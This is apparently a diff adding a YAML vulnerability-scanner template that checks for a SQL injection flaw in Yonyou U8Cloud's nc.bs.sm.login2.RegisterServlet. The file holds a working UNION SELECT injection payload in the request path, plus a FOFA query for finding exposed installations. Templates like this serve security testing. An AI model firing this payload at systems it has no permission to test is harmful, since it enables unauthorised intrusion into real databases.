@@ -1,0 +1,19 @@
+id: poc-yaml-yongyou-u8cloud-nc-bs-sm-login2-registerservlet-sqli
+info:
+  name: 用友U8Cloud nc.bs.sm.login2.RegisterServlet SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)),NULL,NULL,NULL,NULL--
+  headers:
+    X-Forwarded-For: 127.0.0.1
+  expression: status_code == 200 && contains(body,"Error:invalid UFDate") && contains(body,t2)
+    && !contains(body,"<")
+transport: http
